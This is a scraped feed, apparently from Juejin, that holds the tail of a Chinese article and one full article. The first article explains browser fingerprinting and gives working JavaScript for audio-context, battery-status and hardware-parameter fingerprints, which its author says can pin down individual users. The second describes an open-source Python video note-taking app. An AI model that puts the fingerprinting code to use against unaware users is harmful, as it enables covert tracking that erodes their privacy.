<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getAudioFingerprint</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 兼容性处理</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title class_">AudioContext</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">OfflineAudioContext</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitOfflineAudioContext</span>;
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">AudioContext</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// 1. 创建离线上下文：1个声道，44100采样率，5000帧</span>
    <span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AudioContext</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5000</span>, <span class="hljs-number">44100</span>);

    <span class="hljs-comment">// 2. 创建振荡器 (Oscillator)</span>
    <span class="hljs-comment">// 三角波 (triangle) 比正弦波更容易暴露硬件处理的非线性差异</span>
    <span class="hljs-keyword">const</span> oscillator = context.<span class="hljs-title function_">createOscillator</span>();
    oscillator.<span class="hljs-property">type</span> = <span class="hljs-string">'triangle'</span>;
    oscillator.<span class="hljs-property">frequency</span>.<span class="hljs-property">value</span> = <span class="hljs-number">10000</span>;

    <span class="hljs-comment">// 3. 创建动态压缩器 (Compressor) - 核心步骤</span>
    <span class="hljs-comment">// 压缩器的算法在不同浏览器/硬件上实现差异很大</span>
    <span class="hljs-keyword">const</span> compressor = context.<span class="hljs-title function_">createDynamicsCompressor</span>();
    compressor.<span class="hljs-property">threshold</span>.<span class="hljs-property">value</span> = -<span class="hljs-number">50</span>;
    compressor.<span class="hljs-property">knee</span>.<span class="hljs-property">value</span> = <span class="hljs-number">40</span>;
    compressor.<span class="hljs-property">ratio</span>.<span class="hljs-property">value</span> = <span class="hljs-number">12</span>;
    compressor.<span class="hljs-property">reduction</span>.<span class="hljs-property">value</span> = -<span class="hljs-number">20</span>;

    <span class="hljs-comment">// 4. 连接节点：振荡器 -&gt; 压缩器 -&gt; 输出</span>
    oscillator.<span class="hljs-title function_">connect</span>(compressor);
    compressor.<span class="hljs-title function_">connect</span>(context.<span class="hljs-property">destination</span>);

    <span class="hljs-comment">// 5. 开始渲染</span>
    oscillator.<span class="hljs-title function_">start</span>(<span class="hljs-number">0</span>);
    context.<span class="hljs-title function_">startRendering</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">buffer</span> =&gt;</span> {
        <span class="hljs-comment">// 6. 获取渲染后的 PCM 数据</span>
        <span class="hljs-comment">// 这是一个 Float32Array 数组</span>
        <span class="hljs-keyword">const</span> data = buffer.<span class="hljs-title function_">getChannelData</span>(<span class="hljs-number">0</span>);
        
        <span class="hljs-comment">// 7. 计算 Hash</span>
        <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
        <span class="hljs-comment">// 简单累加所有采样点的绝对值，作为指纹</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; data.<span class="hljs-property">length</span>; i++) {
            sum += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(data[i]);
        }
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Audio Fingerprint:"</span>, sum);
    });
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/743bc6a8545d48fc86df91be65b27085~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=ByTKhYxC2hWLTCBDBeZ%2Fp8ivHeI%3D" alt="image.png" loading="lazy"/></p>
<p>不同设备跑出来的 <code>sum</code> 值，会精确到小数点后十几位，那个微小的尾数差异就是指纹。</p>
<hr/>
<h3 data-id="heading-7">电池与硬件并发</h3>
<p>光有 Canvas 和 Audio 还不够（因为同一型号的 iPhone 可能会完全一样）。这时候需要引入<strong>动态硬件特征</strong>来增加熵值。</p>
<h4 data-id="heading-8">电池电量 API <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FBattery_Status_API" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Battery_Status_API" ref="nofollow noopener noreferrer">(Battery Status API)</a></h4>
<p><em>注：由于隐私争议太大，Firefox 和 Safari 已禁用，但 Chrome (部分版本) 和 Android Webview 中依然可能获取。</em></p>
<p>这玩意的逻辑非常粗暴：</p>
<p><strong>电量百分比, 充电/放电时间</strong> 这个组合在特定时间点是极具唯一性的。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 核心代码</span>
navigator.<span class="hljs-title function_">getBattery</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">battery</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> level = battery.<span class="hljs-property">level</span>; <span class="hljs-comment">// 例如 0.55</span>
    <span class="hljs-keyword">const</span> chargingTime = battery.<span class="hljs-property">chargingTime</span>; <span class="hljs-comment">// 例如 1200 (秒)</span>
    <span class="hljs-keyword">const</span> dischargingTime = battery.<span class="hljs-property">dischargingTime</span>; <span class="hljs-comment">// 例如 Infinity</span>
    
    <span class="hljs-comment">// 指纹因子：0.55_1200_Infinity</span>
    <span class="hljs-comment">// 结合 IP，能把用户锁定得死死的</span>
    <span class="hljs-keyword">const</span> batteryFingerprint = <span class="hljs-string">`<span class="hljs-subst">${level}</span>_<span class="hljs-subst">${chargingTime}</span>_<span class="hljs-subst">${dischargingTime}</span>`</span>;
});
</code></pre>
<p>如果我在 1 分钟内连续请求两次，发现你的电量从 <code>0.42</code> 变成了 <code>0.41</code>，这个<strong>变化曲线</strong>也是一种强指纹。</p>
<h4 data-id="heading-9">硬件并发数与内存</h4>
<p>这些是 <code>Navigator</code> 对象上赤裸裸的硬件参数：</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> hardwareInfo = [
    navigator.<span class="hljs-property">hardwareConcurrency</span>, <span class="hljs-comment">// CPU 核心数，如 12</span>
    navigator.<span class="hljs-property">deviceMemory</span>,        <span class="hljs-comment">// 内存大小 (GB)，如 8</span>
    screen.<span class="hljs-property">width</span> + <span class="hljs-string">'x'</span> + screen.<span class="hljs-property">height</span>, <span class="hljs-comment">// 分辨率</span>
    screen.<span class="hljs-property">colorDepth</span>,             <span class="hljs-comment">// 色彩深度，如 24</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>        <span class="hljs-comment">// 像素比，如 2</span>
].<span class="hljs-title function_">join</span>(<span class="hljs-string">'_'</span>);

<span class="hljs-comment">// 输出示例：12_8_2560x1440_24_2</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b9a7adce84c45e995a207814a7b724c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=vUI70Z3yKqcamv%2BrEsJgTANaYeM%3D" alt="image.png" loading="lazy"/></p>
<p>虽然这些参数单看很普通，但如果你把 <strong>CPU + 内存 + 分辨率 + Canvas指纹 + Audio指纹</strong> 拼接在一起，全球几十亿设备中，能和你撞车的概率，几乎为零。</p>
<hr/>
<p>所谓的前端指纹技术，本质上就是<strong>找不同</strong>的一种方式。</p>
<p>开发者利用一切可以调用的 API（Canvas, Audio, WebGL, 硬件信息），强迫浏览器进行某种复杂的运算。由于硬件和驱动的细微差别，运算结果必然存在差异。</p>
<p>这些差异被收集起来，生成了一个字符串。</p>
<p><strong>这就是浏览器在互联网上的唯一ID</strong>，希望对你们有帮助！</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FErpanOmer" target="_blank" title="https://github.com/ErpanOmer" ref="nofollow noopener noreferrer">如果喜欢我的内容，希望给个Start 😁👉⭐Github</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19692b879bbe4e969fdc7263789258cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769482940&amp;x-signature=fmll0ink%2FHyuDt6BA%2F2woh4phTU%3D" alt="谢谢大家.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[还在看视频时切来切去记笔记？我用 Python 写了个带时间戳的播放器，效率提升 10 倍]]></title>    <link>https://juejin.cn/post/7596919439019786249</link>    <guid>https://juejin.cn/post/7596919439019786249</guid>    <pubDate>2026-01-20T01:23:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596919439019786249" data-draft-id="7596890557546250286" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="还在看视频时切来切去记笔记？我用 Python 写了个带时间戳的播放器，效率提升 10 倍"/> <meta itemprop="keywords" content="Python,PyQt"/> <meta itemprop="datePublished" content="2026-01-20T01:23:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Schuyler2025"/> <meta itemprop="url" content="https://juejin.cn/user/605198468525913"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            还在看视频时切来切去记笔记？我用 Python 写了个带时间戳的播放器，效率提升 10 倍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/605198468525913/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Schuyler2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:23:28.000Z" title="Tue Jan 20 2026 01:23:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">痛点：学习视频时的笔记噩梦</h2>
<p>你是不是也经历过这样的场景：</p>
<p>刷技术教程、看课程录像、学习编程视频时，需要频繁在<strong>视频播放器</strong>和<strong>笔记软件</strong>之间切换：</p>
<ul>
<li>看到重点内容，暂停视频 → 切到笔记软件 → 记录要点 → 手动输入时间戳 → 切回视频继续看</li>
<li>稍微一不留神，又得来回拖动进度条定位</li>
<li>多个学习视频混在一起，笔记管理混乱，想回顾某个知识点找不到在哪</li>
</ul>
<p>这种"切换-记录-再切换"的循环，不仅打断学习节奏，还容易遗漏关键信息。如果能在看视频的同时，直接在旁边记笔记，并且能<strong>一键跳转到视频对应位置</strong>，该多好？</p>
<p>于是我花了点时间，用 Python 写了一个<strong>视频播放器笔记应用</strong>，完美解决了这个问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f743486bbd8b4e8cbaac7eefa3ac7f57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2NodXlsZXIyMDI1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769477007&amp;x-signature=xsYAYqHbl%2BHXl%2BZWlauhiOqLagw%3D" alt="test.gif" loading="lazy"/></p>
<h2 data-id="heading-1">核心功能设计</h2>
<p>这个应用主要解决了三个核心痛点：</p>
<h3 data-id="heading-2">1. 视频播放与笔记一体化</h3>
<ul>
<li>左侧是视频播放区域，右侧是 Markdown 笔记编辑器</li>
<li>支持常见视频格式（MP4、AVI、MKV、MOV 等）</li>
<li>全键盘操作，双手不离键盘就能完成所有操作</li>
</ul>
<h3 data-id="heading-3">2. 时间戳自动关联</h3>
<ul>
<li>按 <code>Ctrl+T</code> 一键插入当前视频时间戳</li>
<li>点击笔记中的时间戳，视频自动跳转到对应位置</li>
<li>笔记和视频位置双向绑定，回顾笔记时可以快速定位视频内容</li>
</ul>
<h3 data-id="heading-4">3. 项目化管理</h3>
<ul>
<li>每个视频自动创建独立项目</li>
<li>笔记自动保存，无需手动操作</li>
<li>支持 Markdown/HTML 导出，方便分享</li>
</ul>
<h2 data-id="heading-5">技术实现方案</h2>
<p>项目采用经典的<strong>三层架构</strong>，代码结构清晰易扩展：</p>
<pre><code class="hljs language-bash" lang="bash">video-player-notes/
├── gui/                 <span class="hljs-comment"># 用户界面层（PyQt5）</span>
├── services/            <span class="hljs-comment"># 业务逻辑层</span>
├── repositories/        <span class="hljs-comment"># 数据持久层（SQLite）</span>
├── models/              <span class="hljs-comment"># 数据模型</span>
└── main.py             <span class="hljs-comment"># 应用入口</span>
</code></pre>
<h3 data-id="heading-6">1. 视频播放：VLC + PyQt5</h3>
<p>视频播放使用 <code>python-vlc</code> 作为后端，<code>PyQt5</code> 作为前端容器：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QWidget, QVBoxLayout
<span class="hljs-keyword">import</span> vlc

<span class="hljs-keyword">class</span> <span class="hljs-title class_">VideoWidget</span>(<span class="hljs-title class_ inherited__">QWidget</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">super</span>().__init__()
        self.instance = vlc.Instance()
        self.player = self.instance.media_player_new()

        <span class="hljs-comment"># 创建播放器容器</span>
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_video</span>(<span class="hljs-params">self, file_path: <span class="hljs-built_in">str</span></span>):
        media = self.instance.media_new(file_path)
        self.player.set_media(media)
        self.player.play()
</code></pre>
<p><strong>关键技术点</strong>：</p>
<ul>
<li>VLC 提供强大的视频解码能力，支持几乎所有格式</li>
<li>PyQt5 的 QWidget 作为 VLC 播放器的父容器</li>
<li>通过 <code>set_hwnd()</code> 方法将播放器嵌入到窗口中</li>
</ul>
<h3 data-id="heading-7">2. 时间戳管理</h3>
<p>时间戳是整个应用的核心，需要精确记录和快速跳转：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Timestamp</span>:
    <span class="hljs-built_in">id</span>: <span class="hljs-built_in">int</span>
    note_id: <span class="hljs-built_in">int</span>
    position: <span class="hljs-built_in">float</span>  <span class="hljs-comment"># 视频位置（秒）</span>
    display_time: <span class="hljs-built_in">str</span>  <span class="hljs-comment"># 格式化显示 (MM:SS)</span>
    content: <span class="hljs-built_in">str</span>  <span class="hljs-comment"># 时间戳关联的内容</span>

<span class="hljs-meta">    @classmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">from_position</span>(<span class="hljs-params">cls, note_id: <span class="hljs-built_in">int</span>, position: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-string">'Timestamp'</span>:
        <span class="hljs-string">"""从视频位置创建时间戳"""</span>
        minutes = <span class="hljs-built_in">int</span>(position // <span class="hljs-number">60</span>)
        seconds = <span class="hljs-built_in">int</span>(position % <span class="hljs-number">60</span>)
        display_time = <span class="hljs-string">f"<span class="hljs-subst">{minutes:02d}</span>:<span class="hljs-subst">{seconds:02d}</span>"</span>
        <span class="hljs-keyword">return</span> cls(
            <span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>,
            note_id=note_id,
            position=position,
            display_time=display_time,
            content=<span class="hljs-string">""</span>
        )

<span class="hljs-comment"># 在笔记编辑器中插入时间戳</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">insert_timestamp</span>(<span class="hljs-params">self</span>):
    current_time = self.video_service.get_current_position()
    timestamp = Timestamp.from_position(
        note_id=self.current_note.<span class="hljs-built_in">id</span>,
        position=current_time
    )

    <span class="hljs-comment"># 插入 Markdown 格式的时间戳链接</span>
    timestamp_link = <span class="hljs-string">f"[<span class="hljs-subst">{timestamp.display_time}</span>](#t<span class="hljs-subst">{timestamp.position}</span>)"</span>
    self.note_editor.insert_text(timestamp_link)

    <span class="hljs-comment"># 保存到数据库</span>
    self.timestamp_service.save_timestamp(timestamp)
</code></pre>
<p><strong>亮点设计</strong>：</p>
<ul>
<li>时间戳存储为 Markdown 链接格式 <code>[MM:SS](#t123.45)</code></li>
<li>点击链接时解析时间值，调用 <code>player.set_time()</code> 跳转</li>
<li>数据库持久化所有时间戳，支持搜索和统计</li>
</ul>
<h3 data-id="heading-8">3. 笔记编辑器：Markdown 实时预览</h3>
<p>使用 <code>python-markdown</code> 和 <code>Pygments</code> 实现即时预览：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> markdown
<span class="hljs-keyword">from</span> PyQt5.QtWebEngineWidgets <span class="hljs-keyword">import</span> QWebEngineView

<span class="hljs-keyword">class</span> <span class="hljs-title class_">NoteEditor</span>(<span class="hljs-title class_ inherited__">QWidget</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">super</span>().__init__()
        self.text_input = QTextEdit()
        self.preview = QWebEngineView()

        <span class="hljs-comment"># 实时预览更新</span>
        self.text_input.textChanged.connect(self.update_preview)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_preview</span>(<span class="hljs-params">self</span>):
        raw_text = self.text_input.toPlainText()

        <span class="hljs-comment"># Markdown 转 HTML</span>
        md = markdown.Markdown(
            extensions=[<span class="hljs-string">'fenced_code'</span>, <span class="hljs-string">'tables'</span>, <span class="hljs-string">'codehilite'</span>]
        )
        html_content = md.convert(raw_text)

        <span class="hljs-comment"># 添加自定义样式</span>
        styled_html = <span class="hljs-string">f"""
        &lt;html&gt;
        &lt;head&gt;
            &lt;style&gt;
                body {{ font-family: 'Microsoft YaHei', sans-serif; }}
                code {{ background: #f4f4f4; padding: 2px 6px; }}
                pre {{ background: #2d2d2d; color: #f8f8f2; }}
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;<span class="hljs-subst">{html_content}</span>&lt;/body&gt;
        &lt;/html&gt;
        """</span>
        self.preview.setHtml(styled_html)
</code></pre>
<h3 data-id="heading-9">4. 数据持久化：SQLite</h3>
<p>使用 SQLite 存储笔记和项目数据，轻量且无需额外配置：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db_connection</span>():
    conn = sqlite3.connect(<span class="hljs-string">'video_notes.db'</span>)
    conn.row_factory = sqlite3.Row
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> conn
        conn.commit()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        conn.rollback()
        <span class="hljs-keyword">raise</span> e
    <span class="hljs-keyword">finally</span>:
        conn.close()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">NoteRepository</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_note</span>(<span class="hljs-params">self, note: Note</span>) -&gt; <span class="hljs-built_in">int</span>:
        <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
            cursor = conn.cursor()
            <span class="hljs-keyword">if</span> note.<span class="hljs-built_in">id</span>:
                cursor.execute(<span class="hljs-string">"""
                    UPDATE notes SET content=?, updated_at=datetime('now')
                    WHERE id=?
                """</span>, (note.content, note.<span class="hljs-built_in">id</span>))
                <span class="hljs-keyword">return</span> note.<span class="hljs-built_in">id</span>
            <span class="hljs-keyword">else</span>:
                cursor.execute(<span class="hljs-string">"""
                    INSERT INTO notes (project_id, content)
                    VALUES (?, ?)
                """</span>, (note.project_id, note.content))
                <span class="hljs-keyword">return</span> cursor.lastrowid
</code></pre>
<h2 data-id="heading-10">快速上手</h2>
<h3 data-id="heading-11">安装依赖</h3>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/Schuyler2025/video-player-note.git
<span class="hljs-built_in">cd</span> video-player-note
pip install -r requirements.txt
</code></pre>
<h3 data-id="heading-12">启动应用</h3>
<pre><code class="hljs language-css" lang="css">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span>
</code></pre>
<h3 data-id="heading-13">常用快捷键</h3>
<ul>
<li><code>Space</code> - 播放/暂停</li>
<li><code>← / →</code> - 后退/前进 5 秒</li>
<li><code>Ctrl+T</code> - 插入时间戳</li>
<li><code>Ctrl+N</code> - 新建笔记</li>
<li><code>Ctrl+S</code> - 保存笔记</li>
<li><code>Ctrl+E</code> - 导出笔记</li>
</ul>
<h2 data-id="heading-14">实战场景示例</h2>
<h3 data-id="heading-15">场景 1：学习算法课程</h3>
<p>打开一个排序算法的视频：</p>
<pre><code class="hljs language-ini" lang="ini">00:12 开始讲解冒泡排序原理
冒泡排序通过相邻元素比较和交换来排序...
时间复杂度：O(n²)
空间复杂度：O(1)

05:34 代码实现
def bubble_sort(arr):
    <span class="hljs-attr">n</span> = len(arr)
    for i in range(n):
        for j in range(0, n-i-1):
            if arr<span class="hljs-section">[j]</span> &gt; arr<span class="hljs-section">[j+1]</span>:
                arr<span class="hljs-section">[j]</span>, arr<span class="hljs-section">[j+1]</span> = arr<span class="hljs-section">[j+1]</span>, arr<span class="hljs-section">[j]</span>
</code></pre>
<p>复习时，点击 <code>05:34</code> 立即跳转到代码讲解部分，无需拖动进度条。</p>
<h3 data-id="heading-16">场景 2：技术会议录像</h3>
<p>记录会议亮点：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">01:23 产品架构更新 - 微服务改造</span>
新的架构采用 Spring Cloud 全家桶...

<span class="hljs-section">15:47 性能优化经验</span>
- 引入 Redis 缓存，响应时间从 500ms 降至 50ms
- 数据库分表分库，QPS 提升 10 倍

<span class="hljs-section">28:15 Q&amp;A 环节精彩问答</span>
问：如何处理热点数据？
答：采用多级缓存策略...
</code></pre>
<p>以后想回顾某个知识点，点击对应时间戳即可。</p>
<h2 data-id="heading-17">项目亮点总结</h2>
<p>这个项目虽然不算复杂，但有几个值得学习的地方：</p>
<ol>
<li><strong>分层架构清晰</strong>：GUI、Service、Repository 各司其职，代码易维护</li>
<li><strong>用户体验优先</strong>：全键盘操作、时间戳跳转、自动保存等细节处理到位</li>
<li><strong>技术栈成熟</strong>：PyQt5 + VLC + SQLite 都是稳定可靠的技术</li>
<li><strong>可扩展性强</strong>：支持导出、项目切换，后续可添加更多功能</li>
</ol>
<h2 data-id="heading-18">未来改进方向</h2>
<ul>
<li>添加 OCR 识别，支持截图并提取文字到笔记</li>
<li>支持语音识别，自动生成字幕并同步到笔记</li>
<li>添加 AI 辅助，智能总结视频内容</li>
<li>支持多人协作，共享笔记和标注</li>
</ul>
<h2 data-id="heading-19">写在最后</h2>
<p>这个项目从想法到实现只用了两周时间，但解决了我学习视频时的真实痛点。<strong>好工具不一定需要复杂的技术，关键是找到用户的真实需求并优雅地解决它。</strong></p>
<p>如果你也经常需要看视频学习，不妨试试这个应用。项目源码已开源，欢迎 Star 和提 PR。</p>
<blockquote>
